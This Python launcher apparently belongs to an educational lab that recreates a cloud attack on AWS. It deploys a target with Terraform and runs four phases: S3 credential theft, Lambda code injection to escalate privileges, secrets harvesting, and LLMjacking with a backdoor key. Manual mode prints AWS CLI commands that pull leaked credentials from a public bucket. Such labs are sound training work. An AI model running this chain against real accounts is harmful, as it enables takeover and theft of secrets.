#!/usr/bin/env python3
"""
main.py -- The 8-Minute Takeover: Attack Launcher

Three execution modes:
  Interactive: python main.py          (numbered menu to run individual phases)
  Automated:   python main.py --auto   (full attack chain, no user input)
  Manual:      python main.py --manual (prints commands for manual execution)

Flags:
  --skip-deploy   Skip Terraform deployment (infrastructure already up)
  --skip-cleanup  Leave infrastructure running after attack completes
"""
import argparse
import json
import os
import subprocess
import sys
from pathlib import Path

# Ensure the attack/ directory is on the Python path
sys.path.insert(0, str(Path(__file__).parent))

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt
from rich import box

from config import AttackConfig
from utils import (
    console,
    format_table,
    print_error,
    print_info,
    print_phase_banner,
    print_success,
    print_warning,
)

# =============================================================================
# Constants
# =============================================================================

BANNER = r"""
[bright_red]  _____ _            ___        __  __ _             _         _____     _
 |_   _| |__   ___  ( _ )      |  \/  (_)_ __  _   _| |_ ___  |_   _|_ _| | _____  _____  ___ _ __
   | | | '_ \ / _ \ / _ \/\    | |\/| | | '_ \| | | | __/ _ \   | |/ _` | |/ / _ \/ _ \ \ / / _ \ '__|
   | | | | | |  __/| (_>  <    | |  | | | | | | |_| | ||  __/   | | (_| |   <  __/ (_) \ V /  __/ |
   |_| |_| |_|\___| \___/\/    |_|  |_|_|_| |_|\__,_|\__\___|   |_|\__,_|_|\_\___|\___/ \_/ \___|_|
[/bright_red]
[dim]Based on a real attack observed by Sysdig TRT, November 28, 2025[/dim]
[dim]AI-assisted attacker: stolen S3 credentials -> full admin in 8 minutes[/dim]
"""

TERRAFORM_DIR = str(Path(__file__).parent.parent / "terraform")


# =============================================================================
# Terraform Helpers
# =============================================================================

def run_terraform_deploy() -> bool:
    """Run terraform init + apply in the terraform directory."""
    print_info("Deploying infrastructure with Terraform...")

    # Check terraform is available
    try:
        subprocess.run(
            ["terraform", "version"],
            capture_output=True,
            check=True,
        )
    except (FileNotFoundError, subprocess.CalledProcessError):
        print_error(
            "Terraform not found. Install Terraform >= 1.10.0 first."
        )
        return False

    # Init
    print_info("Running terraform init...")
    result = subprocess.run(
        ["terraform", "init", "-input=false"],
        cwd=TERRAFORM_DIR,
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        print_error(f"terraform init failed:\n{result.stderr}")
        return False

    # Apply
    print_info("Running terraform apply...")
    result = subprocess.run(
        ["terraform", "apply", "-auto-approve", "-input=false"],
        cwd=TERRAFORM_DIR,
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        print_error(f"terraform apply failed:\n{result.stderr}")
        return False

    print_success("Infrastructure deployed successfully")
    return True


# =============================================================================
# Interactive Mode
# =============================================================================

def run_interactive(config: AttackConfig) -> None:
    """Run in interactive menu mode."""
    import exploit
    import escalate
    import exfiltrate
    import impact

    while True:
        console.print()
        console.print(
            Panel(
                "[bright_white]Attack Phases[/bright_white]\n\n"
                "  [bright_cyan]1[/bright_cyan]  Phase 1: Initial Access "
                "(S3 discovery, credential theft, recon)\n"
                "  [bright_red]2[/bright_red]  Phase 2: Privilege Escalation "
                "(Lambda code injection)\n"
                "  [bright_yellow]3[/bright_yellow]  Phase 3: Data Exfiltration "
                "(Secrets Manager + SSM)\n"
                "  [bright_magenta]4[/bright_magenta]  Phase 4: Impact & Persistence "
                "(LLMjacking, GPU, backdoor)\n\n"
                "  [bright_green]5[/bright_green]  Run ALL phases sequentially\n"
                "  [dim]6[/dim]  View current config\n"
                "  [dim]0[/dim]  Exit",
                title="[bold]The 8-Minute Takeover[/bold]",
                border_style="bright_white",
                box=box.ROUNDED,
            )
        )

        try:
            choice = IntPrompt.ask(
                "\n  Select an option",
                choices=["0", "1", "2", "3", "4", "5", "6"],
                default=5,
            )
        except KeyboardInterrupt:
            console.print("\n  Exiting.")
            break

        if choice == 0:
            break
        elif choice == 1:
            exploit.run_phase(config)
        elif choice == 2:
            escalate.run_phase(config)
        elif choice == 3:
            exfiltrate.run_phase(config)
        elif choice == 4:
            impact.run_phase(config)
        elif choice == 5:
            run_all_phases(config)
        elif choice == 6:
            config.print_config_summary()


# =============================================================================
# Automated Mode
# =============================================================================

def run_all_phases(config: AttackConfig) -> None:
    """Run all attack phases sequentially."""
    import exploit
    import escalate
    import exfiltrate
    import impact

    console.print(
        Panel(
            "[bold bright_red]FULL ATTACK CHAIN[/bold bright_red]\n"
            "[dim]Running all 4 phases sequentially...[/dim]",
            border_style="bright_red",
            box=box.DOUBLE,
        )
    )

    all_results = {}

    # Phase 1
    all_results["phase1"] = exploit.run_phase(config)

    # Phase 2
    all_results["phase2"] = escalate.run_phase(config)

    # Phase 3 (requires admin from Phase 2)
    if config.admin_session is not None:
        all_results["phase3"] = exfiltrate.run_phase(config)
    else:
        print_error("Skipping Phase 3: admin credentials not obtained")

    # Phase 4 (requires admin from Phase 2)
    if config.admin_session is not None:
        all_results["phase4"] = impact.run_phase(config)
    else:
        print_error("Skipping Phase 4: admin credentials not obtained")

    # Print summary
    print_attack_summary(config, all_results)


def print_attack_summary(
    config: AttackConfig,
    results: dict,
) -> None:
    """Print a summary table of the full attack."""
    console.print()
    console.print(
        Panel(
            "[bold bright_green]ATTACK COMPLETE[/bold bright_green]",
            border_style="bright_green",
            box=box.DOUBLE,
            expand=True,
        )
    )

    rows = []

    # Phase 1 summary
    p1 = results.get("phase1", {})
    identity = p1.get("identity", {})
    rows.append([
        "Phase 1",
        "Initial Access",
        identity.get("Arn", "N/A"),
    ])

    # Phase 2 summary
    p2 = results.get("phase2", {})
    harvest = p2.get("harvest", {})
    admin_creds = harvest.get("admin_credentials", {})
    admin_key = admin_creds.get("AccessKeyId", "N/A")
    rows.append([
        "Phase 2",
        "Privilege Escalation",
        f"Admin key: {admin_key[:12]}..." if admin_key != "N/A" else "FAILED",
    ])

    # Phase 3 summary
    p3 = results.get("phase3", {})
    sm_count = len(p3.get("secrets", []))
    ssm_count = len(p3.get("parameters", []))
    rows.append([
        "Phase 3",
        "Data Exfiltration",
        f"{sm_count} secrets + {ssm_count} parameters harvested",
    ])

    # Phase 4 summary
    p4 = results.get("phase4", {})
    gpu_result = p4.get("gpu_recon", {}).get("dry_run", "N/A")
    backdoor = p4.get("backdoor", {}).get("access_key", {})
    backdoor_key = backdoor.get("AccessKeyId", "N/A")
    rows.append([
        "Phase 4",
        "Impact & Persistence",
        f"GPU: {gpu_result}, Backdoor: {backdoor_key[:12]}..."
        if backdoor_key != "N/A"
        else f"GPU: {gpu_result}",
    ])

    table = format_table(
        "Attack Summary",
        ["Phase", "Name", "Result"],
        rows,
        ["bright_cyan", "bright_white", "bright_green"],
    )
    console.print(table)


# =============================================================================
# Manual Mode
# =============================================================================

def run_manual(config: AttackConfig) -> None:
    """Print configuration and commands for manual execution."""
    console.print(
        Panel(
            "[bold bright_yellow]MANUAL MODE[/bold bright_yellow]\n"
            "[dim]Infrastructure is deployed. Follow the commands below "
            "or see docs/attack_guide.md for the full walkthrough.[/dim]",
            border_style="bright_yellow",
            box=box.DOUBLE,
        )
    )

    config.print_config_summary()

    console.print()
    console.print("[bold]Quick Start Commands:[/bold]")
    console.print()
    console.print(
        f"  [bright_cyan]# Step 1: List the public bucket[/bright_cyan]"
    )
    console.print(
        f"  aws s3 ls s3://{config.bucket_name}/ "
        f"--no-sign-request --recursive"
    )
    console.print()
    console.print(
        f"  [bright_cyan]# Step 2: Download credentials[/bright_cyan]"
    )
    console.print(
        f"  aws s3 cp s3://{config.bucket_name}"
        f"/config/pipeline-config.env - --no-sign-request"
    )
    console.print()
    console.print(
        f"  [bright_cyan]# Step 3: Configure attacker profile[/bright_cyan]"
    )
    console.print(
        '  aws configure set aws_access_key_id "<KEY>" --profile attacker'
    )
    console.print(
        '  aws configure set aws_secret_access_key "<SECRET>" --profile attacker'
    )
    console.print(
        f'  aws configure set region "{config.aws_region}" --profile attacker'
    )
    console.print()
    console.print(
        f"  [bright_cyan]# Step 4: Verify identity[/bright_cyan]"
    )
    console.print("  aws sts get-caller-identity --profile attacker")
    console.print()
    console.print(
        "[dim]For the complete educational walkthrough with detailed "
        "explanations,[/dim]"
    )
    console.print(
        "[dim]see: [bold]docs/attack_guide.md[/bold][/dim]"
    )


# =============================================================================
# Main Entry Point
# =============================================================================

def main() -> None:
    parser = argparse.ArgumentParser(
        description="The 8-Minute Takeover: Cloud Attack Simulation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python main.py           # Interactive menu\n"
            "  python main.py --auto    # Full automated attack chain\n"
            "  python main.py --manual  # Print commands for manual execution\n"
        ),
    )
    parser.add_argument(
        "--auto",
        action="store_true",
        help="Run all phases automatically with no user input",
    )
    parser.add_argument(
        "--manual",
        action="store_true",
        help="Deploy infrastructure and print manual execution commands",
    )
    parser.add_argument(
        "--skip-deploy",
        action="store_true",
        help="Skip Terraform deployment (infrastructure already running)",
    )
    parser.add_argument(
        "--skip-cleanup",
        action="store_true",
        help="Leave infrastructure running after attack completes",
    )

    args = parser.parse_args()

    # Print banner
    console.print(BANNER)

    # Deploy infrastructure if needed
    if not args.skip_deploy:
        tfvars = Path(TERRAFORM_DIR) / "terraform.tfvars"
        if not tfvars.exists():
            example = Path(TERRAFORM_DIR) / "terraform.tfvars.example"
            if example.exists():
                print_warning(
                    "terraform.tfvars not found. "
                    "Copying from terraform.tfvars.example..."
                )
                import shutil
                shutil.copy2(str(example), str(tfvars))
            else:
                print_error(
                    "No terraform.tfvars or terraform.tfvars.example found."
                )
                sys.exit(1)

        if not run_terraform_deploy():
            print_error("Infrastructure deployment failed. Exiting.")
            sys.exit(1)
    else:
        print_info("Skipping Terraform deployment (--skip-deploy)")

    # Load configuration from Terraform outputs
    try:
        config = AttackConfig(terraform_dir=TERRAFORM_DIR)
    except SystemExit:
        print_error(
            "Failed to load configuration. "
            "Is the infrastructure deployed?"
        )
        sys.exit(1)

    # Route to the appropriate mode
    try:
        if args.manual:
            run_manual(config)
        elif args.auto:
            run_all_phases(config)
        else:
            run_interactive(config)
    except KeyboardInterrupt:
        console.print("\n\n  [dim]Attack interrupted by user.[/dim]")
    except Exception as exc:
        print_error(f"Unexpected error: {exc}")
        raise

    # Cleanup reminder
    if not args.skip_cleanup and not args.manual:
        console.print()
        print_warning(
            "Remember to clean up! Run: ./cleanup.sh "
            "or: cd terraform && terraform destroy"
        )


if __name__ == "__main__":
    main()
